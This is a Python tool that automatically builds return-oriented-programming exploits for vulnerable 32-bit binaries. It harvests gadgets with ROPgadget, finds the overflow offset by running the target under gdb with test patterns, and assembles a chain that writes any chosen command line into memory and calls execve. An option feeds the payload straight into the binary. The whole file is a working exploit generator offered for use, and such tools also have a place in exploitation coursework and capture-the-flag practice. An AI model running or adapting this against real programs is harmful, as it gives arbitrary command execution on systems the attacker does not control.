#!/usr/bin/env python
from struct import pack
import subprocess
import os
import sys
import pprint as pp
import argparse

def main(parser):

    # run ROPgadget tool to get useful rop gadgets
    rop = subprocess.Popen(['ROPgadget', '--binary', '{}'.format(parser.binary), '--ropchain', '--silent'],
                        stdout=subprocess.PIPE,
                        universal_newlines=True,
                        bufsize=0)
    rop.wait()

    rop_gadgets = {
        'stackAddr' : None,
        'mov' : None,
        'popDst' : None,
        'popSrc' : None,
        'xorSrc' : None,
        'popB' : None,
        'popC' : None,
        'popD' : None,
        'xorA' : None,
        'incA' : None,
        'sys' : None
    }

    for line in rop.stdout:
        if "Step 1" in line:
            while "Step 2" not in line:
                if '[+]' in line:
                    gadget = line.split(' ')
                    if rop_gadgets['mov'] == None:
                        rop_gadgets['mov'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                    elif rop_gadgets['popDst'] == None:
                        rop_gadgets['popDst'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                    elif rop_gadgets['popSrc'] == None:
                        rop_gadgets['popSrc'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                    elif rop_gadgets['xorSrc'] == None:
                        rop_gadgets['xorSrc'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                if '[-]' in line:
                    rop_gadgets['mov'] = None
                    rop_gadgets['popDst'] = None
                    rop_gadgets['popSrc'] = None
                    rop_gadgets['xorSrc'] = None
                try:
                    line = next(rop.stdout)
                except:
                    sys.exit('\nROPgadget couldn\'t find necessary gadgets')
        if "Step 2" in line:
            while "Step 3" not in line:
                if '[+]' in line:
                    gadget = line.split(' ')
                    if rop_gadgets['xorA'] == None:
                        rop_gadgets['xorA'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                    elif rop_gadgets['incA'] == None:
                        rop_gadgets['incA'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                try:
                    line = next(rop.stdout)
                except:
                    sys.exit('\nROPgadget couldn\'t find necessary gadgets')
        if "Step 3" in line:
            while "Step 4" not in line:
                if '[+]' in line:
                    gadget = line.split(' ')
                    if rop_gadgets['popB'] == None:
                        rop_gadgets['popB'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                    elif rop_gadgets['popC'] == None:
                        rop_gadgets['popC'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                    elif rop_gadgets['popD'] == None:
                        rop_gadgets['popD'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                try:
                    line = next(rop.stdout)
                except:
                    sys.exit('\nROPgadget couldn\'t find necessary gadgets')
        if "Step 4" in line:
            while "Step 5" not in line:
                if '[+]' in line:
                    gadget = line.split(' ')
                    rop_gadgets['sys'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                try:
                    line = next(rop.stdout)
                except:
                    sys.exit('\nROPgadget couldn\'t find necessary gadgets')
        if "Step 5" in line:
            if parser.data_addr:
                rop_gadgets['stackAddr'] = (parser.data_addr, '@ .data')
            else:
                while '.data' not in line:
                    try:
                        line = next(rop.stdout)
                    except:
                        sys.exit('\nROPgadget couldn\'t find necessary gadgets')
                gadget = line.split(' ')
                rop_gadgets['stackAddr'] = (gadget[3][:-1], ' '.join(gadget[4:])[2:-1])

    # check if .data contains null bytes
    addr_remove_null = list(rop_gadgets['stackAddr'][0]) 
    print('addr: ', addr_remove_null, '\n')
    if (addr_remove_null[-8] == '0' and addr_remove_null[-7] == '0'):
        addr_remove_null[-7] = '1'
    if (addr_remove_null[-6] == '0' and addr_remove_null[-5] == '0'):
        addr_remove_null[-5] = '1'
    if (addr_remove_null[-4] == '0' and addr_remove_null[-3] == '0'):
        addr_remove_null[-3] = '1'
    if (addr_remove_null[-2] == '0' and addr_remove_null[-1] == '0'):
        addr_remove_null[-1] = '1'
    addr_remove_null = ''.join(addr_remove_null)
    rop_gadgets['stackAddr'] = (addr_remove_null, '@ .data')
    print('addr after: ', addr_remove_null, '\n')

    pp.pprint(rop_gadgets)

    if not parser.print:
        padding = 8 # probably won't be less than 8
        lowest = 0
        highest = float('inf')
        found = False
        too_much = False

        while True:
            # if we get stuck
            # happens when current padding is more than needed, but our pattern "DCBA" 
            # hasn't been found and we know the highest result that results in "FFFF" pattern
            if lowest + 1 == highest:
                padding -= 3

            too_much = False
            os.system('perl -e \'print "F"x{}, "DCBA"\' > {}'.format(padding, parser.gdb_run))
            gdb = subprocess.Popen(["gdb", "{}".format(parser.binary)],
                                    stdin =subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    universal_newlines=True,
                                    bufsize=0)

            gdb.stdin.write("r {}\n".format(parser.gdb_run))
            gdb.stdin.close()

            for line in gdb.stdout:
                # print(line.strip())
                if 'SIGSEGV' in line:
                    line = next(gdb.stdout)
                    # print(line.split(' ')[0][2:])
                    if line.split(' ')[0][2:] == '41424344':
                        print("LENGTH OF PADDING:", padding, "\n")
                        found = True
                    if line.split(' ')[0][2:] == '46464646': # too much padding, go lower
                        if highest > padding:
                            highest = padding
                        padding = (lowest + highest) // 2
                        # print('pad: ', padding, '\n')
                        too_much = True
            if found:
                os.system('rm {}'.format(parser.gdb_run))
                break
            if not too_much:
                if lowest < padding:
                    lowest = padding
                    padding *= 2
            # print('l: ', lowest, ' h: ', highest,'\n')
            # print('pad: ', padding, '\n')

    STACKADDR = int(rop_gadgets['stackAddr'][0], 0)
    MOV = pack("<I", int(rop_gadgets['mov'][0], 0))
    POPDST = pack("<I", int(rop_gadgets['popDst'][0], 0))
    POPSRC = pack("<I", int(rop_gadgets['popSrc'][0], 0))
    XORSRC = pack("<I", int(rop_gadgets['xorSrc'][0], 0))
    POPB = pack("<I", int(rop_gadgets['popB'][0], 0))
    POPC = pack("<I", int(rop_gadgets['popC'][0], 0))
    POPD = pack("<I", int(rop_gadgets['popD'][0], 0))
    XORA = pack("<I", int(rop_gadgets['xorA'][0], 0))
    INCA = pack("<I", int(rop_gadgets['incA'][0], 0))
    SYS = pack("<I", int(rop_gadgets['sys'][0], 0))
    PAD = pack("<I", 0x46464646)

    # automatic 
    def setA(pointer):
        buff = bytes('', 'ascii')
        buff += XORA
        buff += addPadding(rop_gadgets['xorA'][1], {'ebx': 0, 'ecx': pointer})

        for _ in range(11):
            buff += INCA
            buff += addPadding(rop_gadgets['incA'][1], {'ebx': 0, 'ecx': pointer})
        
        return buff

    def pushNULLbyOffset(offset):
        buff = bytes('', 'ascii')
        buff += POPDST
        # print('NULL: ', STACKADDR + offset, '\n')
        buff += pack("<I", STACKADDR + offset)
        buff += addPadding(rop_gadgets['popDst'][1], {})

        buff += XORSRC
        buff += addPadding(rop_gadgets['xorSrc'][1], {})

        buff += MOV
        buff += addPadding(rop_gadgets['mov'][1], {})
        return buff

    def pushNULLonAddress(address):
        buff = bytes('', 'ascii')
        buff += POPDST
        # print('NULL: ', address, '\n')
        buff += pack("<I", address)
        buff += addPadding(rop_gadgets['popDst'][1], {})

        buff += XORSRC
        buff += addPadding(rop_gadgets['xorSrc'][1], {})

        buff += MOV
        buff += addPadding(rop_gadgets['mov'][1], {})
        return buff

    def addPadding(gadget, regsSet):
        result = bytes('', 'ascii')
        # print('gadget: ', gadget, '\n')
        # print('regSet: ', regsSet, '\n')
        gadgetOps = gadget.split(' ; ')
        # print('ops: ', gadgetOps, '\n')
        for g in gadgetOps[1:]:
            g = g.split()
            # print('g: ', g, '\n')
            if g[0] == 'pop':
                reg = g[1]
                try:
                    # print('regSet: ', regsSet, '\n')
                    # print('reg: ',reg,'\n')
                    # print('w: ', regsSet[reg], '\n')
                    result += pack("<I", STACKADDR + regsSet[reg])
                except KeyError:
                    result += PAD

        return result

    # command_line = input('Command: ').split()
    command_line = parser.execute.split()
    # print('cmd_line: ', command_line)
    exec = command_line[0]
    if exec[0] != '/' or exec[0] != '.' or exec[0] != '~':
        which = subprocess.Popen(['which', "{}".format(exec)],
                                    stdout=subprocess.PIPE,
                                    universal_newlines=True,
                                    bufsize=0)
        which.wait()
        for line in which.stdout:
            exec = line[:-1]

    args = command_line[1:]
    # print('args: ', args, '\n')

    # add initial padding
    if parser.print:
        p = bytes('', 'ascii')
    else:
        p = bytes('A' * padding, 'ascii')

    # ===================================================================================
    # *filename SECTION
    # ===================================================================================

    # we'll use this to point to the right location on stack
    stack_addr_pointer = 0

    exec_correct_length = len(exec) % 4
    if exec_correct_length != 0:
        # *filename can start with / or ./
        exec = exec[0] + '/' * (4 - exec_correct_length) + exec[1:]
        print('command: ', exec, '\n')

    for _ in range(int(len(exec)/4)):
        p += POPDST
        p += pack("<I", STACKADDR + stack_addr_pointer)
        p += addPadding(rop_gadgets['popDst'][1], {})

        p += POPSRC
        p += bytes(exec[stack_addr_pointer : stack_addr_pointer + 4], 'ascii')
        p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})

        p += MOV
        p += addPadding(rop_gadgets['mov'][1], {})
        stack_addr_pointer += 4

    # push a NULL onto the stack after command is on stack 
    p += pushNULLbyOffset(stack_addr_pointer)

    # this puts a NULL pointer after the exec, however if we supply arguments,
    # we just need a \0 so we can start writing 1 byte after exec
    if len(args) != 0:
        stack_addr_pointer += 1

    # ===================================================================================
    # *argv[] SECTION
    # ===================================================================================

    arg_addresses = {exec : STACKADDR}
    args_len = len(args)

    for i in range(args_len):
        arg = args[i]
        arg_addresses[arg] = STACKADDR + stack_addr_pointer
        arg_correct_length = len(arg) % 4
        # print('args_size: ', arg_missing_length, '\n')
        if arg_correct_length != 0:
            arg += (4 - arg_correct_length) * 'A' # padding
            print('arg: ', arg, '\n')

        arg_size = int(len(arg)/4)
        arg_pointer = 0

        for j in range(arg_size):

            p += POPDST
            p += pack("<I", STACKADDR + stack_addr_pointer)
            p += addPadding(rop_gadgets['popDst'][1], {})

            p += POPSRC
            p += bytes(arg[arg_pointer : arg_pointer + 4], 'ascii')
            p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})

            p += MOV
            p += addPadding(rop_gadgets['mov'][1], {})
            arg_pointer += 4

            print('stack_pointer_before: ', stack_addr_pointer, '\n')
            if j == arg_size - 1 and arg_correct_length != 0:
                stack_addr_pointer += arg_correct_length
            else:
                stack_addr_pointer += 4

        p += pushNULLbyOffset(stack_addr_pointer)
        if i != args_len - 1:
            stack_addr_pointer += 1

    # *argv[] needs last elemnt to be NULL pointer 
    arg_addresses['NULL'] = STACKADDR + stack_addr_pointer

    # print('--------------------------------------\n')
    # pp.pprint(arg_addresses)

    # ===================================================================================
    # SHADOW STACK SECTION
    # ===================================================================================

    shadow_stack_address = arg_addresses['NULL'] + 4
    arg_addresses['SHADOW_STACK'] = shadow_stack_address

    comm_len = len(command_line)
    for i in range(comm_len):

        p += pushNULLonAddress(shadow_stack_address)

        p += POPDST
        p += pack("<I", shadow_stack_address)
        p += addPadding(rop_gadgets['popDst'][1], {})

        p += POPSRC
        if i == 0:
            p += pack('<I', arg_addresses[exec])
        else:
            p += pack('<I', arg_addresses[args[i - 1]])
        p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_stack_address})

        p += MOV
        p += addPadding(rop_gadgets['mov'][1], {})
        if i != comm_len - 1:
            shadow_stack_address += 4

    # NULL pointer
    p += pushNULLonAddress(shadow_stack_address + 4)

    p += POPB
    p += pack("<I", arg_addresses[exec])
    p += addPadding(rop_gadgets['popB'][1], {})

    p += POPC
    p += pack("<I", arg_addresses['SHADOW_STACK'])
    p += addPadding(rop_gadgets['popC'][1], {'ebx': 0})

    p += POPD
    p += pack("<I", arg_addresses['NULL'])
    p += addPadding(rop_gadgets['popD'][1], {'ebx': 0, 'ecx': stack_addr_pointer})

    p += setA(stack_addr_pointer)

    p += SYS

    out = open('{}'.format(parser.output), 'wb')
    out.write(p)
    out.close()

    if parser.print:
        print(p, '\n')
    elif parser.autorun:
        run = subprocess.Popen(['{}'.format(parser.binary), '{}'.format(parser.output)],
                                    universal_newlines=True,
                                    bufsize=0)
        run.wait()


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('-b', '-bin', '--binary', required=True, action='store', type=str,
                        help='Path to the vulnerable binary')
    parser.add_argument('-e', '-exe', '--execute', required=True, action='store', type=str,
                        help='Command line to turn into ROPchain')
    parser.add_argument('-o', '--output', required=False, action='store', type=str,
                        help='Specify file where ROPchain will be saved', default='rop-output')
    parser.add_argument('-g', '-gdb', '--gdb_run', required=False, action='store', type=str,
                        help='Name of the file where different padding will be tested and then ran in gdb',
                        default='padding')
    parser.add_argument('-a', '--autorun', required=False, action='store_true',
                        help='Will attempt to automatically run the generated ROPcode in the vulnerable binary')
    parser.add_argument('-p', '--print', required=False, action='store_true',
                        help='Only prints generated ROPchain without any padding')
    parser.add_argument('-d', '-data', '--data_addr', required=False, action='store', type=str,
                        help='Manually set the writable data section in hex')
    args = parser.parse_args()

    main(args)